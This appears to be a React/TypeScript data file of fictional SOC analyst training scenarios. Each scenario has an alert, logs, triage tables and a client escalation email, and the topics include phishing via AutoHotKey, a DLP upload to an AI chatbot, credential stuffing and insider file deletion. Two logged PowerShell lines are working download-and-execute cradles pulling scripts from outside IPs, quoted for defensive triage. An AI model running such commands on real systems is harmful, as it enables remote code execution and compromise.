import React from 'react';
import { Code, MessageSquare, User, Cloud, Zap, Mail } from 'lucide-react';

export interface LogEntry {
  title: string;
  content: Record<string, string | number | boolean>;
}

export interface WorkflowStep {
  title: string;
  content: string;
  table?: {
    headers: string[];
    rows: string[][];
  };
}

export interface ScenarioDetail {
  id: string;
  title: string;
  icon: React.ElementType;
  color: string;
  alert: {
    name: string;
    severity: 'High' | 'Critical' | 'Medium';
    client: string;
    source: string;
    endpoint: string;
    user: string;
    triggerTime: string;
  };
  background: string;
  correlatedLogs: LogEntry[];
  workflow: WorkflowStep[];
  escalationSubject: string;
  escalationBody: string;
  finalDocumentation: Record<string, string>;
}

export const socScenarios: ScenarioDetail[] = [
  {
    id: 'powershell-autohotkey',
    title: 'PowerShell Execution via AutoHotKey Macro on Finance Department Endpoint',
    icon: Code,
    color: 'text-green-500',
    alert: {
      name: 'Suspicious PowerShell Execution Triggered via User Interface Automation',
      severity: 'High',
      client: 'QuantumDelta Holdings',
      source: 'EDR (SentinelOne) + UEBA + Microsoft Defender Logs + SIEM',
      endpoint: 'FIN-LAPTOP-004',
      user: 'nurfarah.sulaiman@quantumdelta.com',
      triggerTime: '2025-06-13 11:44 GMT+8',
    },
    background: 'A finance executive’s laptop executed a PowerShell command that was triggered via an AutoHotKey script masquerading as a PDF reader macro. The script was delivered through a phishing email with a zipped attachment named Invoice_Q2-PDFReader.zip. The script used GUI automation to simulate keystrokes and mouse movements to launch PowerShell stealthily, evading traditional macro-blocking and script controls.',
    correlatedLogs: [
      {
        title: 'Log 1: EDR Alert – Unusual PowerShell Invocation Chain',
        content: {
          "timestamp": "2025-06-13T03:44:02Z",
          "host": "FIN-LAPTOP-004",
          "user": "nurfarah.sulaiman",
          "parentProcess": "autohotkey.exe",
          "childProcess": "powershell.exe",
          "commandLine": "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://185.101.94.70/init.ps1')\"",
          "outcome": "Blocked (EDR Policy)",
          "detectionType": "Execution via GUI automation"
        }
      },
      {
        title: 'Log 2: UEBA Alert – Rare Process Chain',
        content: {
          "user": "nurfarah.sulaiman@quantumdelta.com",
          "anomalyScore": 89,
          "alertType": "Rare process chain: AutoHotKey -> PowerShell",
          "firstSeen": "Yes",
          "host": "FIN-LAPTOP-004"
        }
      },
      {
        title: 'Log 3: Email Gateway Log (Phishing Email)',
        content: {
          "emailSubject": "Invoice Q2 and VAT Summary",
          "sender": "finance.ap@onesteel-global.com",
          "attachmentName": "Invoice_Q2-PDF-Reader.zip",
          "sandboxResult": "Suspicious – .ahk script masquerading as invoice viewer",
          "deliveryStatus": "Delivered (no malware signature detected)"
        }
      }
    ],
    workflow: [
      {
        title: 'Step 1: SOC L1 Triage',
        content: 'The L1 analyst reviews the initial alert and correlated logs to determine the immediate threat level and required escalation path.',
        table: {
          headers: ['Question', 'Answer', 'Notes'],
          rows: [
            ['Was PowerShell executed from a non-standard source?', 'Yes', 'Invoked by autohotkey.exe instead of explorer.exe or cmd.exe'],
            ['Was the user intentionally executing a script?', 'Unlikely', 'Email attachment disguised as invoice viewer'],
            ['Was the PowerShell payload allowed to run?', 'Blocked', 'EDR prevented execution of payload from init.ps1'],
            ['Escalation Decision', 'Escalate to L2', 'Escalate to L2 for phishing analysis, user confirmation, and endpoint forensics'],
          ]
        }
      },
      {
        title: 'Step 2: SOC L2 Analysis',
        content: 'The L2 analyst performs deeper investigation using threat intelligence and forensic data to confirm the attack vector and scope.',
        table: {
          headers: ['Question', 'Answer', 'Notes'],
          rows: [
            ['Was the AutoHotKey binary signed or trusted?', 'No', 'Dropped from ZIP, unsigned'],
            ['Was the script disguised as a PDF reader or viewer?', 'Yes', 'Pretended to launch PDF GUI, but executed macro'],
            ['Was the PowerShell script downloaded from a known malicious IP?', 'Yes', '185.101.94.70 listed in April 2025 IOC feeds'],
            ['Was there any user interaction (clicking/opening ZIP)?', 'Yes', 'Email logs confirm user opened ZIP and ran executable'],
            ['Any lateral movement from this endpoint?', 'No', 'No post-execution network or credential abuse logged'],
            ['Is the user a high-risk target (e.g., finance)?', 'Yes', 'Handles vendor invoices and e-banking activities'],
          ]
        }
      },
      {
        title: 'Step 3: Decision – Escalate to Client?',
        content: 'The L2 analyst determines that the incident warrants immediate client notification due to the sophistication and target.',
        table: {
          headers: ['Reason', 'Status'],
          rows: [
            ['Sophisticated phishing with GUI automation abuse', 'High Risk'],
            ['PowerShell used for potential remote payload', 'High Risk'],
            ['Targeted finance executive', 'High Risk'],
            ['Blocked before lateral movement, but user/system at risk', 'Contained but Critical'],
          ]
        }
      },
    ],
    escalationSubject: '[HIGH] Phishing Attack Using GUI Automation to Trigger PowerShell on Finance Endpoint',
    escalationBody: `Dear QuantumDelta IT Security Team,

We are escalating a phishing-based malware delivery attempt that used GUI automation scripting (AutoHotKey) to stealthily execute PowerShell on a finance department endpoint. The attempt was successfully blocked by EDR, but the delivery method represents a modern evasive technique bypassing traditional defences.

**Incident Summary**
• User: nurfarah.sulaiman@quantumdelta.com
• Endpoint: FIN-LAPTOP-004
• Time: 2025-06-13 11:44 GMT+8
• Script Trigger: AutoHotKey macro (Invoice_Q2-PDF-Reader.zip)
• Payload URL: http://185.101.94.70/init.ps1
• Malware Family: Likely AsyncRAT variant (based on signature match)
• Outcome: Blocked – No payload executed

**Risk Assessment**
• Macro executed via GUI automation to evade policy blocks
• Delivered through realistic finance-themed phishing lure
• High-value user targeted (invoice and banking role)
• Could have led to RAT deployment, credential theft, or data exfiltration

**Recommendations**
1. Immediately scan FIN-LAPTOP-004 for persistence mechanisms or residual scripts
2. Reset password for nurfarah.sulaiman and audit session tokens
3. Block IP 185.101.94.70 across perimeter and endpoint systems
4. Update email filters to block .ahk and disguised ZIP payloads
5. Educate finance team on evasion-based phishing techniques

Please confirm if MSSP should:
• Perform full memory forensics on endpoint
• Add .ahk signature detection in SIEM rules
• Launch targeted phishing simulation for finance department

Best regards,
CYSEC MSSP SOC Team
Escalation Ref: QD-GUIAUTOMATION-0613-021`,
    finalDocumentation: {
      "Alert ID": "SIEM-CL-QD-202506131144",
      "Escalation ID": "QD-GUIAUTOMATION-0613-021",
      "Alert Category": "Endpoint Threat – GUI Macro Execution via AHK",
      "Escalated To": "QuantumDelta IR + Endpoint Ops",
      "Severity": "High",
      "Status": "Escalated – Awaiting scan + account reset",
      "Final Recommendation": "Phishing hardening + script filtering + IOC blocklist update",
    }
  },
  {
    id: 'genai-dlp',
    title: 'Generative AI Misuse – File Upload to Public Chatbot via Corporate Endpoint',
    icon: MessageSquare,
    color: 'text-purple-500',
    alert: {
      name: 'Confidential Data Posted to External AI Tool',
      severity: 'High',
      client: 'NovaEnergy Utilities Sdn Bhd',
      source: 'Endpoint DLP + DNS Logs + Browser Monitoring (via XDR & Proxy)',
      endpoint: 'HR-LAPTOP-07',
      user: 'suraya.amin@novaenergy.com',
      triggerTime: '2025-06-23 11:44 GMT+8',
    },
    background: 'MSSP deployed browser telemetry and DLP policies to monitor traffic to Generative AI endpoints like ChatGPT, Claude, Gemini and open-source front ends. Alert fired when confidential document data was uploaded to a known AI input form from a corporate endpoint.',
    correlatedLogs: [
      {
        title: 'Log 1: Endpoint Activity Log (XDR Agent)',
        content: {
          "timestamp": "2025-06-23T03:44:12Z",
          "hostname": "HR-LAPTOP-07",
          "user": "suraya.amin@novaenergy.com",
          "fileName": "Salary-Banding-Q3-Confidential.xlsx",
          "action": "Opened",
          "process": "excel.exe",
          "md5": "b64f9abcb812d94d337aa0b92e1905d2"
        }
      },
      {
        title: 'Log 2: Web Request (Browser Telemetry via Secure Proxy)',
        content: {
          "timestamp": "2025-06-23T03:44:27Z",
          "user": "suraya.amin@novaenergy.com",
          "url": "https://aiassist.chat.openmodelai.org",
          "method": "POST",
          "uploadedContent": "salary banding table",
          "sourceDevice": "HR-LAPTOP-07",
          "browser": "Edge 119.0",
          "contentType": "application/vnd.ms-excel",
          "documentHash": "b64f9abcb812d94d337aa0b92e1905d2"
        }
      },
      {
        title: 'Log 3: DNS + Threat Intelligence Enrichment',
        content: {
          "dnsQuery": "aiassist.chat.openmodelai.org",
          "threatCategory": "Generative AI - Unauthorised",
          "reputation": "Monitored – Custom Policy Violation",
          "matchedPolicy": "No AI Upload for HR Documents"
        }
      }
    ],
    workflow: [
      {
        title: 'Step 1: Validate Alert – L1 Analyst',
        content: 'The L1 analyst confirms the DLP violation and verifies the file hash match between the endpoint activity and the web request.',
        table: {
          headers: ['Question', 'Answer', 'Notes'],
          rows: [
            ['Is this a valid DLP policy violation?', 'Yes', 'Match on sensitive HR data file with corporate classification tag'],
            ['Was the file hash matched to actual upload?', 'Yes', 'Same hash from XDR and upload logs'],
            ['Was the user operating on corporate device, not BYOD?', 'Yes', 'Device: HR-LAPTOP-07 (in asset inventory)'],
            ['Escalation Decision', 'Escalate to L2', 'Escalate to L2 for deeper analysis'],
          ]
        }
      },
      {
        title: 'Step 2: L2 Analysis – Contextual Behaviour Review',
        content: 'The L2 analyst reviews the context of the file and the destination to assess the risk and intentionality.',
        table: {
          headers: ['Question', 'Answer', 'Notes'],
          rows: [
            ['Was the file classified as confidential internally?', 'Yes', 'Tag: HR - Internal Only'],
            ['Was the destination listed under restricted AI tools?', 'Yes', 'Listed in DLP Policy #AIBlock-002'],
            ['Was the user warned or prompted before upload?', 'No', 'No blocking control triggered'],
            ['Was this action intentional or accidental (based on behaviour)?', 'Unknown', 'Needs user confirmation'],
            ['Has this user triggered similar events before?', 'No', 'First offence'],
          ]
        }
      },
      {
        title: 'Step 3: Decision – Escalate to Client?',
        content: 'The L2 analyst determines that the incident warrants immediate client notification due to the sensitivity of the data and compliance risks.',
        table: {
          headers: ['Reason', 'Status'],
          rows: [
            ['Clear DLP violation', 'High Risk'],
            ['Upload of sensitive HR document to unauthorised Generative AI site', 'High Risk'],
            ['Could result in unintentional data leakage or ingestion into AI model', 'High Risk'],
            ['Potential breach of PDPA and internal data handling policies', 'Compliance Risk'],
          ]
        }
      },
    ],
    escalationSubject: '[HIGH] Confidential HR Data Uploaded to Public AI Tool – User suraya.amin@novaenergy.com',
    escalationBody: `Dear NovaEnergy SOC Team,

This is to inform you that our monitoring tools have detected a Data Loss Prevention (DLP) violation involving confidential HR data and the use of an external Generative AI platform. The incident details are as follows:

**Incident Summary**
• User: suraya.amin@novaenergy.com
• Device: HR-LAPTOP-07
• File Involved: Salary-Banding-Q3-Confidential.xlsx
• Destination Site: https://aiassist.chat.openmodelai.org
• Action: File data submitted via POST request
• Time: 2025-06-23 11:44 GMT+8

**Risk Summary**
• The file is tagged as Confidential – Internal Use Only and contains salary banding data for Q3.
• The destination platform is not sanctioned by NovaEnergy and is listed under the prohibited GenAI endpoint category.
• The upload was performed from a corporate-managed device using a secure browser, indicating possible unintentional data exposure or tool misuse.

**Recommendations**
1. Immediately engage the user for clarification (was it intentional or testing-related?).
2. Restrict access to AI-related endpoints temporarily for user or department.
3. Review and enhance AI usage policy enforcement through SOAR or inline proxy control.
4. Classify incident under “Policy Violation – External Data Disclosure” and assess whether notification to PDPA compliance team is required.

**Supporting Artifacts**
• XDR file access log (Excel opened with MD5 hash)
• Web telemetry: POST to AI chatbot with document hash match
• DNS categorisation confirming unsanctioned endpoint
• Policy reference: AI-Block-002, DLP-Browser-Rule-11

Please confirm if you would like us to:
• Quarantine the device for further forensic review
• Block the user temporarily from accessing corporate tools
• Include this in monthly compliance violation reporting

Best regards,
CYSEC MSSP SOC Team
Escalation Ref: NOVA-GENAI-0623-002`,
    finalDocumentation: {
      "Alert ID": "SIEM-CL-NOVA-202506231144",
      "Escalation ID": "NOVA-GENAI-0623-002",
      "Alert Category": "DLP + GenAI Tool Use",
      "Escalated To": "NovaEnergy SOC / HR Security Officer",
      "Severity": "High",
      "Status": "Escalated – Pending Client Response",
      "Follow-Up Time": "3 hours",
      "Final Recommendation": "User review, policy reinforcement, block AI POST",
    }
  },
  {
    id: 'credential-stuffing',
    title: 'Credential Stuffing Detected on External Login Portal via API Gateway',
    icon: User,
    color: 'text-red-500',
    alert: {
      name: 'Multiple Failed Logins via API – Suspected Credential Stuffing',
      severity: 'Medium',
      client: 'Digibank M Bhd',
      source: 'WAF + API Gateway Logs + Threat Intelligence Feeds',
      endpoint: 'External Login Portal API',
      user: 'Multiple usernames (faiz.r@digibank.com, aida.k@digibank.com, etc.)',
      triggerTime: '2025-06-23 02:27 GMT+8',
    },
    background: 'MSSP monitors external-facing banking login portals and their APIs for abuse patterns. Alert fired when a burst of login attempts with known breached usernames was detected over HTTPS via the public API endpoint.',
    correlatedLogs: [
      {
        title: 'Log 1: API Gateway Log – Credential Stuffing Pattern',
        content: {
          "timestamp": "2025-06-23T02:27:16Z",
          "endpoint": "/api/v1/auth/login",
          "sourceIP": "102.215.91.67",
          "userAgent": "Mozilla/5.0 (Linux; Android 10)",
          "usernamesAttempted": "faiz.r@digibank.com, aida.k@digibank.com, badrul.h@digibank.com (and 195 others)",
          "totalAttempts": 198,
          "successCount": 0,
          "method": "POST",
          "location": "Lagos, Nigeria"
        }
      },
      {
        title: 'Log 2: WAF Alert – Brute Force Signature',
        content: {
          "timestamp": "2025-06-23T02:28:01Z",
          "sourceIP": "102.215.91.67",
          "attackType": "Credential Stuffing",
          "ruleID": "WAF-CREDSTUFF-014",
          "detectedURIs": "/api/v1/auth/login",
          "actionTaken": "Blocked after 100 requests",
          "confidence": "High"
        }
      },
      {
        title: 'Log 3: Threat Intelligence Enrichment (IOC Lookup)',
        content: {
          "ip": "102.215.91.67",
          "feedName": "Credential Abuse Proxy - Africa Region",
          "riskScore": "92",
          "firstSeen": "2025-05-12",
          "associatedThreat": "Automated Credential Stuffing Infrastructure"
        }
      }
    ],
    workflow: [
      {
        title: 'Step 1: Triage – L1 Analyst',
        content: 'The L1 analyst reviews the initial alert and correlated logs to determine the immediate threat level and required escalation path.',
        table: {
          headers: ['Question', 'Answer', 'Notes'],
          rows: [
            ['Are these failed logins consistent with brute force or credential stuffing?', 'Yes', 'Multiple usernames, same endpoint, short time window'],
            ['Are there any successful logins from the same IP?', 'No', 'All login attempts failed'],
            ['Was the request blocked?', 'Yes', 'WAF blocked at threshold of 100 attempts'],
            ['Escalation Decision', 'Escalate to L2', 'Escalate to L2 for deeper review and threat validation'],
          ]
        }
      },
      {
        title: 'Step 2: Deep Analysis – L2 Analyst',
        content: 'The L2 analyst performs deeper investigation using threat intelligence and forensic data to confirm the attack vector and scope.',
        table: {
          headers: ['Question', 'Answer', 'Notes'],
          rows: [
            ['Does the IP match known malicious infrastructure?', 'Yes', 'TI feed match with high confidence'],
            ['Were multiple unique usernames tried in sequence from same source?', 'Yes', 'Indicates enumeration/stuffing'],
            ['Were all login attempts unsuccessful?', 'Yes', 'No user sessions established'],
            ['Did the WAF respond correctly and within limits?', 'Yes', 'Block triggered as per rule threshold'],
            ['Is there a known pattern or reused email addresses (from breaches)?', 'Yes', '6 emails matched breach database'],
            ['Any repeat activity from same IP in the last 7 days?', 'Yes', 'Seen 3 times on finance clients'],
          ]
        }
      },
      {
        title: 'Step 3: Decision – Escalate to Client?',
        content: 'The L2 analyst determines that the incident warrants immediate client notification due to the sophistication and target.',
        table: {
          headers: ['Reason', 'Status'],
          rows: [
            ['Repeated automated attempts with breached usernames', 'High Risk'],
            ['Confirmed credential stuffing infrastructure', 'High Risk'],
            ['Attack blocked but worth notifying client for visibility and potential password resets', 'Contained but Critical'],
            ['Could indicate account targeting prior to phishing or MFA bypass attempts', 'High Risk'],
          ]
        }
      },
    ],
    escalationSubject: '[HIGH] Credential Stuffing Attack Attempt Blocked on API Login – External Threat from Nigeria',
    escalationBody: `Dear Digibank Security Operations,
Our systems have detected and mitigated a credential stuffing attack targeting your login API endpoint. Below are the key details of the attempted activity:

**Incident Summary**
• Time of Attempt: 2025-06-23 02:27 GMT+8
• Source IP: 102.215.91.67 (Nigeria – listed in credential abuse TI feed)
• Endpoint Targeted: /api/v1/auth/login
• Total Attempts: 198
• Usernames Used: faiz.r@digibank.com, aida.k@digibank.com, badrul.h@digibank.com, others
• Success Rate: 0 (All failed)
• WAF Action: Blocked after 100 attempts
• Reputation Score of IP: 92 (Very High Risk)

**MSSP Observations**
• Behaviour aligned with automated credential stuffing – rapid POST attempts on multiple known email addresses
• Source IP tied to known infrastructure used in attacks across financial clients
• No sessions were established; no evidence of compromise at this time
• WAF blocking was effective, no bypass detected

**Recommendations**
1. Force password reset for affected usernames found in leaked datasets
2. Enhance rate-limiting and anomaly detection for login-related APIs
3. Review MFA configurations for external logins
4. Monitor for repeated login attempts from same region/IP over next 7 days
5. Tag user accounts for fraud watchlisting if needed

**Supporting Data**
• API logs (POST events with usernames)
• WAF alert logs with rule ID and block confirmation
• IOC feed entry for malicious IP
• Threat context from global credential abuse watchlists

Please advise if you require:
• Temporary geo-blocking policy enforcement
• Password reset enforcement by MSSP via IAM API
• Additional monitoring rule changes

Best regards,
CYSEC MSSP SOC Team
Escalation Ref: DIGI-CREDSTUFF-0623-003`,
    finalDocumentation: {
      "Alert ID": "SIEM-CL-DIGI-202506230227",
      "Escalation ID": "DIGI-CREDSTUFF-0623-003",
      "Alert Category": "Credential Abuse (Stuffing)",
      "Escalated To": "Digibank IR / Fraud Prevention Team",
      "Severity": "Medium (Elevated to High due to TI match)",
      "Status": "Escalated – Pending Advisory",
      "Follow-Up Time": "12 hours or on detection of retry",
      "Final Recommendation": "Password resets + enhanced detection logic",
    }
  },
  {
    id: 'insider-cloud-deletion',
    title: 'Insider Threat – Suspicious Data Deletion from Shared Cloud Storage',
    icon: Cloud,
    color: 'text-orange-500',
    alert: {
      name: 'Bulk Deletion of Files from Shared Drive Outside Business Hours',
      severity: 'High',
      client: 'Altura Pharma Berhad',
      source: 'Cloud Activity Logs + UEBA + DLP',
      endpoint: 'CORP-LAPTOP-52',
      user: 'nur.syazwan@alturapharma.com',
      triggerTime: '2025-06-22 23:38 GMT+8',
    },
    background: 'MSSP monitors all corporate Google Workspace/OneDrive cloud activity for insider threat indicators. An alert was triggered when a large volume of files from the “R&D Product Formulations” folder were deleted in one session, outside standard business hours.',
    correlatedLogs: [
      {
        title: 'Log 1: Cloud Storage Activity (Google Drive Audit Log)',
        content: {
          "timestamp": "2025-06-22T15:38:16Z",
          "user": "nur.syazwan@alturapharma.com",
          "action": "Delete",
          "filesAffected": 113,
          "folder": "/Shared Drive/R&D/Product Formulations/",
          "device": "CORP-LAPTOP-52",
          "location": "Shah Alam, Malaysia",
          "sessionID": "SESS-0981F22"
        }
      },
      {
        title: 'Log 2: UEBA Alert – Abnormal Behaviour',
        content: {
          "timestamp": "2025-06-22T15:40:01Z",
          "user": "nur.syazwan@alturapharma.com",
          "behaviour": "Unusual File Activity",
          "deviationScore": 89,
          "details": "Bulk deletion of high-sensitivity files outside working hours",
          "triggeredRule": "UEBA-DELETE-OFFHOURS"
        }
      },
      {
        title: 'Log 3: DLP File Tagging Summary',
        content: {
          "folder": "/Shared Drive/R&D/Product Formulations/",
          "totalFilesTaggedConfidential": 71,
          "classificationSource": "Altura Internal DLP Engine",
          "lastBackupStatus": "Backup Completed 6 hours prior (19:15 GMT+8)"
        }
      }
    ],
    workflow: [
      {
        title: 'Step 1: Initial Triage – SOC L1',
        content: 'The L1 analyst reviews the initial alert and correlated logs to determine the immediate threat level and required escalation path.',
        table: {
          headers: ['Question', 'Answer', 'Notes'],
          rows: [
            ['Was the deletion volume significant?', 'Yes', '113 files in one batch'],
            ['Were any of the files tagged as confidential or sensitive?', 'Yes', '71 of them'],
            ['Was the action performed during business hours?', 'No', 'Detected at 11:38 PM GMT+8'],
            ['Escalation Decision', 'Escalate to L2', 'Escalate to L2 for behavioural review and context correlation'],
          ]
        }
      },
      {
        title: 'Step 2: L2 Analysis – Insider Risk Context',
        content: 'The L2 analyst performs deeper investigation using threat intelligence and forensic data to confirm the attack vector and scope.',
        table: {
          headers: ['Question', 'Answer', 'Notes'],
          rows: [
            ['Is this behaviour aligned with historical user activity?', 'No', 'Never performed deletions at this scale'],
            ['Is the device corporate-owned and in known location?', 'Yes', 'CORP-LAPTOP-52 in Shah Alam (IP known)'],
            ['Is the folder part of a high-value research project?', 'Yes', 'R&D formulations – IP critical'],
            ['Is there any sign of recent resignation/submission of notice?', 'Unknown', 'Requires client HR check'],
            ['Is this covered by current DLP policy or only UEBA?', 'Both', 'Detected by both'],
            ['Were the files already backed up?', 'Yes', 'Cloud backup ran at 7:15 PM same day'],
          ]
        }
      },
      {
        title: 'Step 3: Decision – Escalate to Client?',
        content: 'The L2 analyst determines that the incident warrants immediate client notification due to the sophistication and target.',
        table: {
          headers: ['Reason', 'Status'],
          rows: [
            ['Action is clearly out of pattern', 'High Risk'],
            ['Data deletion impacts intellectual property (R&D)', 'High Risk'],
            ['Performed at night without change request or approval', 'High Risk'],
            ['UEBA deviation score > 85 (high concern)', 'High Risk'],
          ]
        }
      },
    ],
    escalationSubject: '[HIGH] Suspicious Bulk File Deletion from R&D Drive – Insider Threat Risk (User: nur.syazwan@alturapharma.com)',
    escalationBody: `Dear Altura Pharma Security Team,
An alert was generated by our insider threat detection engine when a large number of sensitive files were deleted from a shared R&D folder by an employee during off-hours. Please see the incident details below:

**Incident Summary**
• User: nur.syazwan@alturapharma.com
• Device: CORP-LAPTOP-52
• Action Time: 2025-06-22 23:38 GMT+8
• Files Deleted: 113
• Confidential Files Affected: 71
• Folder: /Shared Drive/R&D/Product Formulations/
• UEBA Deviation Score: 89 (High Risk)
• Last Backup: Completed at 19:15 GMT+8 same day
• Trigger Rules: DLP-Tag-Delete & UEBA-DELETE-OFFHOURS

**Observations**
• Activity deviates significantly from user's historical behaviour.
• Folder contains proprietary product formulations – considered highly sensitive.
• Deletion occurred outside approved working hours, with no matching change ticket or justification.
• No prior insider alert history from this user.

**Recommendations**
1. Engage the user for intent confirmation (HR and IT joint call).
2. Restore files immediately from backup snapshot.
3. Restrict user’s access to R&D drives pending investigation.
4. Check if the user has submitted resignation or is transitioning roles.
5. Consider forensic imaging of the laptop if foul play is suspected.

**Supporting Artifacts**
• Google Workspace audit logs (file deletions)
• UEBA scorecard for deviation context
• File classification report (DLP tags)
• Backup verification summary

Please confirm your preferred course of action. Our team is on standby to assist with forensic review or user containment if required.

Best regards,
CYSEC MSSP SOC Team
Escalation Ref: ALTURA-INSDR-0622-004`,
    finalDocumentation: {
      "Alert ID": "SIEM-CL-ALTURA-202506222338",
      "Escalation ID": "ALTURA-INSDR-0622-004",
      "Alert Category": "Insider Threat – Data Deletion",
      "Escalated To": "Altura Pharma CSIRT + HR Liaison",
      "Severity": "High",
      "Status": "Escalated – Pending Internal User Review",
      "Follow-Up Time": "2 hours",
      "Final Recommendation": "User access revocation + data restoration + review",
    }
  },
  {
    id: 'service-account-powershell',
    title: 'Suspicious PowerShell Execution from Backup Service Account',
    icon: Code,
    color: 'text-green-500',
    alert: {
      name: 'Unusual PowerShell Execution – Service Account Activity',
      severity: 'High',
      client: 'Medivault Tech Sdn Bhd',
      source: 'EDR (XDR Agent) + Sysmon + UEBA',
      endpoint: 'SRV-AD-03',
      user: 'svc_backup@medivault.local',
      triggerTime: '2025-06-22 03:19 GMT+8',
    },
    background: 'Service accounts are monitored for abnormal interactive activity. This account svc_backup@medivault.local is used for backup automation and is not expected to initiate remote scripts or perform PowerShell commands outside backup hours (2:00 AM–2:30 AM GMT+8). Alert fired due to execution of suspicious PowerShell command outside that window.',
    correlatedLogs: [
      {
        title: 'Log 1: Sysmon Event – PowerShell Execution',
        content: {
          "event_id": 4104,
          "timestamp": "2025-06-22T19:19:47Z",
          "host": "SRV-AD-03",
          "user": "svc_backup@medivault.local",
          "scriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('http://185.101.94.13/recon.ps1')",
          "processName": "powershell.exe",
          "parentProcess": "svchost.exe",
          "hash": "ac8e3c91bdf249ed62a0eae8a7a109b9"
        }
      },
      {
        title: 'Log 2: EDR Alert – Malicious PowerShell Pattern',
        content: {
          "timestamp": "2025-06-22T19:20:03Z",
          "eventType": "SuspiciousCommand",
          "user": "svc_backup@medivault.local",
          "device": "SRV-AD-03",
          "command": "DownloadString from external IP",
          "commandHash": "ac8e3c91bdf249ed62a0eae8a7a109b9",
          "severity": "High",
          "IOCMatched": "Remote Payload Download"
        }
      },
      {
        title: 'Log 3: UEBA Event – Service Account Behavioural Deviation',
        content: {
          "user": "svc_backup@medivault.local",
          "timestamp": "2025-06-22T19:21:00Z",
          "behaviour": "Unusual PowerShell Usage",
          "riskScore": 92,
          "description": "Service account executed PowerShell with external reach-out – pattern not seen in 90-day baseline."
        }
      }
    ],
    workflow: [
      {
        title: 'Step 1: L1 Validation',
        content: 'The L1 analyst reviews the initial alert and correlated logs to determine the immediate threat level and required escalation path.',
        table: {
          headers: ['Question', 'Answer', 'Notes'],
          rows: [
            ['Is this a legitimate service account action?', 'No', 'Not within backup automation time window'],
            ['Is the PowerShell command expected or whitelisted?', 'No', 'IEX (Invoke-Expression) and external download are not approved'],
            ['Was it run interactively or via system process?', 'Looks initiated under svchost.exe', 'Stealth technique'],
            ['Escalation Decision', 'Escalate to L2', 'Escalate to L2 for context review and possible containment'],
          ]
        }
      },
      {
        title: 'Step 2: L2 Deep Analysis',
        content: 'The L2 analyst performs deeper investigation using threat intelligence and forensic data to confirm the attack vector and scope.',
        table: {
          headers: ['Question', 'Answer', 'Notes'],
          rows: [
            ['Does the scriptBlockText indicate malicious intent?', 'Yes', 'IEX + remote payload fetch from external IP'],
            ['Is the source IP (185.101.94.13) known in threat intel feeds?', 'Yes', 'Listed under C2 infrastructure watchlist'],
            ['Is the service account domain privileged?', 'Yes', 'Can access backup shares and remote folders'],
            ['Any recent changes to the service account (password, permissions)?', 'Unknown', 'Requires domain audit from client'],
            ['Was any file written or dropped on the endpoint after script ran?', 'Not detected yet', 'Needs deeper forensic pull if approved'],
            ['Has the same command been executed from other endpoints?', 'No', 'Isolated to SRV-AD-03 as of now'],
          ]
        }
      },
      {
        title: 'Step 3: Decision – Escalate to Client?',
        content: 'The L2 analyst determines that the incident warrants immediate client notification due to the sophistication and target.',
        table: {
          headers: ['Reason', 'Status'],
          rows: [
            ['Malicious PowerShell execution from privileged account', 'High Risk'],
            ['Tactic matches common C2 beaconing (via DownloadString)', 'High Risk'],
            ['Triggered across Sysmon, EDR and UEBA', 'High Risk'],
            ['Service account likely compromised or misused', 'High Risk'],
          ]
        }
      },
    ],
    escalationSubject: '[HIGH] Suspicious PowerShell Execution from Backup Service Account – Potential Compromise (svc_backup@medivault.local)',
    escalationBody: `Dear Medivault IR Team,
Our monitoring tools have detected suspicious PowerShell activity originating from a critical service account used for automated backup operations. This activity may indicate compromise or unauthorised script injection. Details as follows:

**Incident Summary**
• User: svc_backup@medivault.local
• Device: SRV-AD-03
• Time: 2025-06-22 03:19 GMT+8
• Activity: PowerShell script execution
• Command: IEX(New-Object Net.WebClient).DownloadString('http://185.101.94.13/recon.ps1')
• Tool Detection: Sysmon + EDR + UEBA
• Deviated From Baseline: Yes (not observed in past 90 days)

**Risk Assessment**
• The script is attempting to download a PowerShell payload from an IP known to host C2 infrastructure.
• The account involved has high privileges in the backup environment.
• Behaviour significantly deviates from the account’s expected usage and normal hours of operation.
• There is no legitimate justification found in policy or automation logs.

**Recommendations**
1. Immediately disable the service account or rotate credentials.
2. Isolate the affected host (SRV-AD-03) for forensic review.
3. Hunt for related activity across other critical infrastructure (PowerShell logs, lateral movement).
4. Review Group Policy and backup automation to prevent service disruption after account disablement.
5. Scan endpoint and memory for dropped payloads.

**Supporting Data**
• Sysmon Event ID 4104 log entry (script block execution)
• EDR alert metadata (command hash, detection pattern)
• UEBA behavioural deviation report
• Threat Intel match for external IP: 185.101.94.13

Please confirm if you would like MSSP team to:
• Execute SOAR playbook to disable account
• Perform forensic triage and malware memory dump
• Apply temporary outbound PowerShell restriction via GPO

Best regards,
CYSEC MSSP SOC Team
Escalation Ref: MEDIVAULT-POWERSHELL-0622-005`,
    finalDocumentation: {
      "Alert ID": "SIEM-CL-MEDI-202506220319",
      "Escalation ID": "MEDIVAULT-POWERSHELL-0622-005",
      "Alert Category": "Suspicious Script Execution – Service Account",
      "Escalated To": "Medivault IR + Domain Admins",
      "Severity": "High",
      "Status": "Escalated – Pending Response",
      "Follow-Up Time": "1 hour (due to potential privilege abuse)",
      "Final Recommendation": "Disable account + Host isolation + Forensic review",
    }
  },
  // Placeholder scenarios
  { id: 'cloud-misconfig-s3', title: 'Cloud Misconfiguration (S3 Exposure)', icon: Cloud, color: 'text-blue-500', alert: { name: 'Public Bucket Detected', severity: 'High', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
  { id: 'lateral-movement-psexec', title: 'Lateral Movement via PsExec', icon: Zap, color: 'text-red-500', alert: { name: 'PsExec Usage', severity: 'High', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
  { id: 'mfa-push-fatigue', title: 'MFA Push Fatigue Attack', icon: User, color: 'text-orange-500', alert: { name: 'MFA Failure Spike', severity: 'Medium', client: 'N/A', source: 'N/A', endpoint: 'N/A', user: 'N/A', triggerTime: 'N/A' }, background: 'Placeholder', correlatedLogs: [], workflow: [], escalationSubject: 'Placeholder', escalationBody: 'Placeholder', finalDocumentation: {} },
